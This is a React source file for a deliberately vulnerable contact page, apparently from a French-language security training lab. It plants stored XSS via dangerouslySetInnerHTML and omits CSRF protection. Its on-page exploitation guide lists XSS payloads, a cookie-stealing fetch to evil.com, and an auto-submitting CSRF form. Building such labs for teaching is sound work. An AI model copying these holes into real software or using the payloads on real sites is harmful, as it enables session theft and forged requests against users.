
import { useState } from 'react';
import { Link } from 'react-router-dom';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Textarea } from '@/components/ui/textarea';
import { Alert, AlertDescription } from '@/components/ui/alert';
import { ArrowLeft, AlertTriangle, Mail, Send } from 'lucide-react';
import { toast } from "sonner";

const Contact = () => {
  const [formData, setFormData] = useState({
    name: '',
    email: '',
    subject: '',
    message: ''
  });
  const [submittedMessages, setSubmittedMessages] = useState<Array<{id: number, name: string, email: string, subject: string, message: string, date: string}>>([]);
  const [showMessages, setShowMessages] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    // VULNÉRABILITÉ 1: PAS DE TOKEN CSRF
    // Ce formulaire peut être soumis depuis n'importe quel site externe
    console.log('NO CSRF TOKEN - CSRF attack possible');
    
    // VULNÉRABILITÉ 2: XSS STOCKÉ dans les messages
    // Les données ne sont pas filtrées avant stockage
    const message = {
      id: Date.now(),
      name: formData.name, // Pas de filtrage XSS
      email: formData.email,
      subject: formData.subject,
      message: formData.message, // Contenu dangereux possible
      date: new Date().toLocaleString()
    };

    // Stockage sans validation
    const existingMessages = JSON.parse(localStorage.getItem('contactMessages') || '[]');
    existingMessages.push(message);
    localStorage.setItem('contactMessages', JSON.stringify(existingMessages));
    
    setSubmittedMessages(existingMessages);
    
    console.log('XSS VULNERABLE MESSAGE STORED:', message);
    toast.success("Message envoyé (XSS stocké possible!)");
    
    // Reset du formulaire
    setFormData({ name: '', email: '', subject: '', message: '' });
  };

  const loadMessages = () => {
    const messages = JSON.parse(localStorage.getItem('contactMessages') || '[]');
    setSubmittedMessages(messages);
    setShowMessages(true);
  };

  const simulateCSRF = () => {
    // VULNÉRABILITÉ 3: Démonstration d'attaque CSRF
    console.log('CSRF ATTACK SIMULATION');
    
    // Simulation d'un formulaire soumis depuis un site malveillant
    const csrfPayload = {
      name: 'CSRF Attacker',
      email: 'hacker@evil.com',
      subject: 'Message envoyé via CSRF',
      message: '<script>alert("CSRF Attack Successful!")</script>'
    };

    const existingMessages = JSON.parse(localStorage.getItem('contactMessages') || '[]');
    existingMessages.push({
      id: Date.now(),
      ...csrfPayload,
      date: new Date().toLocaleString()
    });
    localStorage.setItem('contactMessages', JSON.stringify(existingMessages));
    
    setSubmittedMessages(existingMessages);
    toast.error("Attaque CSRF simulée réussie!");
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-purple-50 p-4">
      <div className="container mx-auto max-w-4xl space-y-6">
        <div className="flex items-center justify-between">
          <Link to="/" className="inline-flex items-center gap-2 text-blue-600 hover:text-blue-800">
            <ArrowLeft className="h-4 w-4" />
            Retour à l'accueil
          </Link>
          <div className="space-x-2">
            <Button onClick={loadMessages} variant="outline">
              Voir les messages
            </Button>
            <Button onClick={simulateCSRF} className="bg-red-600 hover:bg-red-700">
              Simuler CSRF
            </Button>
          </div>
        </div>

        <div className="grid md:grid-cols-2 gap-6">
          {/* Formulaire de contact */}
          <Card className="border-red-200">
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Mail className="h-5 w-5" />
                <AlertTriangle className="h-4 w-4 text-red-600" />
                Contact Vulnérable
              </CardTitle>
            </CardHeader>
            <CardContent>
              <Alert className="mb-6 border-red-200">
                <AlertTriangle className="h-4 w-4" />
                <AlertDescription className="text-red-700">
                  <strong>Vulnérabilités:</strong> Pas de token CSRF, XSS stocké possible, validation côté client uniquement
                </AlertDescription>
              </Alert>

              <form onSubmit={handleSubmit} className="space-y-4">
                <div>
                  <Label htmlFor="name">Nom</Label>
                  <Input
                    id="name"
                    value={formData.name}
                    onChange={(e) => setFormData({...formData, name: e.target.value})}
                    placeholder="<script>alert('XSS')</script>"
                    required
                  />
                </div>

                <div>
                  <Label htmlFor="email">Email</Label>
                  <Input
                    id="email"
                    type="email"
                    value={formData.email}
                    onChange={(e) => setFormData({...formData, email: e.target.value})}
                    placeholder="test@example.com"
                    required
                  />
                </div>

                <div>
                  <Label htmlFor="subject">Sujet</Label>
                  <Input
                    id="subject"
                    value={formData.subject}
                    onChange={(e) => setFormData({...formData, subject: e.target.value})}
                    placeholder="<img src=x onerror=alert('XSS')>"
                    required
                  />
                </div>

                <div>
                  <Label htmlFor="message">Message</Label>
                  <Textarea
                    id="message"
                    value={formData.message}
                    onChange={(e) => setFormData({...formData, message: e.target.value})}
                    placeholder="<iframe src=javascript:alert('XSS')></iframe>"
                    rows={5}
                    required
                  />
                </div>

                <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700">
                  <Send className="h-4 w-4 mr-2" />
                  Envoyer (sans CSRF token)
                </Button>
              </form>

              <div className="mt-4 text-xs text-gray-600">
                <p><strong>Note:</strong> Ce formulaire n'a pas de protection CSRF et stocke les données sans filtrage XSS.</p>
              </div>
            </CardContent>
          </Card>

          {/* Messages soumis (avec XSS) */}
          <Card className="border-orange-200">
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                📝 Messages Reçus (XSS)
                <AlertTriangle className="h-4 w-4 text-orange-600" />
              </CardTitle>
            </CardHeader>
            <CardContent>
              {!showMessages ? (
                <div className="text-center py-8">
                  <p className="text-gray-600 mb-4">Cliquez sur "Voir les messages" pour afficher les messages soumis</p>
                  <Button onClick={loadMessages} variant="outline">
                    Charger les messages
                  </Button>
                </div>
              ) : (
                <div className="space-y-4 max-h-96 overflow-y-auto">
                  {submittedMessages.length === 0 ? (
                    <p className="text-gray-500">Aucun message reçu</p>
                  ) : (
                    submittedMessages.map((msg) => (
                      <div key={msg.id} className="border rounded p-3 bg-gray-50">
                        <div className="flex justify-between items-start mb-2">
                          {/* VULNÉRABILITÉ CRITIQUE: XSS STOCKÉ */}
                          <strong dangerouslySetInnerHTML={{ __html: msg.name }} />
                          <span className="text-xs text-gray-500">{msg.date}</span>
                        </div>
                        <p className="text-sm text-gray-600">{msg.email}</p>
                        <h4 
                          className="font-medium mt-2"
                          dangerouslySetInnerHTML={{ __html: msg.subject }}
                        />
                        <div 
                          className="text-sm mt-2"
                          dangerouslySetInnerHTML={{ __html: msg.message }}
                        />
                      </div>
                    ))
                  )}
                </div>
              )}
            </CardContent>
          </Card>
        </div>

        {/* Guide d'exploitation */}
        <Card className="border-red-300">
          <CardHeader>
            <CardTitle className="text-red-700">Guide d'exploitation - Formulaire de Contact</CardTitle>
          </CardHeader>
          <CardContent className="text-sm space-y-4">
            <div>
              <strong className="text-red-600">1. XSS Stocké:</strong>
              <ul className="ml-4 mt-1 space-y-1">
                <li>• Nom: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
                <li>• Sujet: <code>&lt;img src=x onerror=alert('XSS')&gt;</code></li>
                <li>• Message: <code>&lt;iframe src=javascript:alert('XSS')&gt;&lt;/iframe&gt;</code></li>
                <li>• Cookie stealing: <code>&lt;script&gt;fetch('http://evil.com/steal?c='+document.cookie)&lt;/script&gt;</code></li>
              </ul>
            </div>

            <div>
              <strong className="text-orange-600">2. Attaque CSRF:</strong>
              <p className="ml-4 mt-1">Créer une page HTML malveillante:</p>
              <pre className="ml-4 mt-2 text-xs bg-gray-800 text-green-400 p-2 rounded">
{`<form action="http://vulnerable-site.com/contact" method="POST">
  <input type="hidden" name="name" value="Hacker" />
  <input type="hidden" name="message" value="<script>...</script>" />
</form>
<script>document.forms[0].submit();</script>`}
              </pre>
            </div>

            <div>
              <strong className="text-purple-600">3. Validation côté client:</strong>
              <ul className="ml-4 mt-1 space-y-1">
                <li>• Désactiver JavaScript pour contourner les validations</li>
                <li>• Utiliser un proxy (Burp Suite) pour modifier les requêtes</li>
                <li>• Envoyer des données malformées directement en POST</li>
              </ul>
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

export default Contact;
